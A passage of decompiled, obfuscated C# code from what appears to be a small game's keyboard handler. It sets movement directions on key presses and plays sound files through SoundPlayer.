          \u0008\u2002.\u0002(ref this.\u0008\u2001.\u0008, ref this.\u0008\u2001.\u0006, this);
          new SoundPlayer(Environment.CurrentDirectory + \u0005\u2007.\u0002(-1359009389)).Play();
          num2 = 11;
        }
        else
        {
          flag5 = _param2.Key == Key.A;
          num2 = 15;
        }
      }
label_1:
      if (!flag1)
      {
        this.\u0002.Add(obj);
        num1 = 16;
        continue;
      }
      break;
label_5:
      this.\u000F\u2001.\u0008.\u0005.X = 1.0;
      num1 = 18;
      continue;
label_6:
      new SoundPlayer(Environment.CurrentDirectory + \u0005\u2007.\u0002(-1359009363)).Play();
      goto label_51;
label_8:
      flag2 = _param2.Key == Key.P;
      num1 = 7;
      continue;
label_10:
      if (this.\u0005\u2000)
      {
        num1 = 6;
        continue;
      }
      this.\u0005\u2000 = true;
      goto label_32;
label_12:
      this.\u000F\u2001.\u0008.\u0005.Y = 0.0;
      this.\u000F\u2001.\u0008.\u0005.Z = 0.0;
      \u0008\u2002.\u0002(ref this.\u000F\u2001.\u0008, ref this.\u000F\u2001.\u0006, this);
      new SoundPlayer(Environment.CurrentDirectory + \u0005\u2007.\u0002(-1359009363)).Play();
      num1 = 17;
      continue;
label_15:
      this.\u0008\u2001.\u0008.\u0005.X = 0.0;
      this.\u0008\u2001.\u0008.\u0005.Y = 1.0;
      this.\u0008\u2001.\u0008.\u0005.Z = 0.0;
      \u0008\u2002.\u0002(ref this.\u0008\u2001.\u0008, ref this.\u0008\u2001.\u0006, this);
      soundPlayer1 = new SoundPlayer(Environment.CurrentDirectory + \u0005\u2007.\u0002(-1359009389));
      num1 = 21;
      continue;
label_21:
      this.\u0008\u2001.\u0008.\u0005.X = 1.0;
      num1 = 20;
      continue;
label_22:
      this.\u000F\u2001.\u0008.\u0005.Z = 0.0;
      \u0008\u2002.\u0002(ref this.\u000F\u2001.\u0008, ref this.\u000F\u2001.\u0006, this);
      num1 = 8;
      continue;
label_28:
      this.\u000F\u2001.\u0008.\u0005.X = 0.0;
      this.\u000F\u2001.\u0008.\u0005.Y = -1.0;
      num1 = 5;
      continue;
label_30:
      this.\u0005\u2000 = false;
label_32:
      this.\u0003();
      flag4 = this.\u0002(this);
      num1 = 14;
      continue;
label_33:
      soundPlayer2.Play();
      goto label_51;
label_35:
      this.\u000F\u2001.\u0008.\u0005.X = -1.0;
      this.\u000F\u2001.\u0008.\u0005.Y = 0.0;
      this.\u000F\u2001.\u0008.\u0005.Z = 0.0;
      \u0008\u2002.\u0002(ref this.\u000F\u2001.\u0008, ref this.\u000F\u2001.\u0006, this);
      new SoundPlayer(Environment.CurrentDirectory + \u0005\u2007.\u0002(-1359009363)).Play();
      goto label_51;
label_39:
      num1 = 13;
      continue;
label_40:
      if (flag5)
      {
        this.\u0008\u2001.\u0008.\u0005.X = -1.0;
        this.\u0008\u2001.\u0008.\u0005.Y = 0.0;
        this.\u0008\u2001.\u0008.\u0005.Z = 0.0;
        \u0008\u2002.\u0002(ref this.\u0008\u2001.\u0008, ref this.\u0008\u2001.\u0006, this);
        soundPlayer3 = new SoundPlayer(Environment.CurrentDirectory + \u0005\u2007.\u0002(-1359009389));
        num1 = 2;
        continue;
      }
      flag3 = _param2.Key == Key.D;
      num1 = 4;
      continue;
label_51:
      this.\u0003();
      num1 = 24;
    }
    return;
label_47:;
  }

  internal static bool \u0002() => true;

  internal static bool \u0003() => false;
}
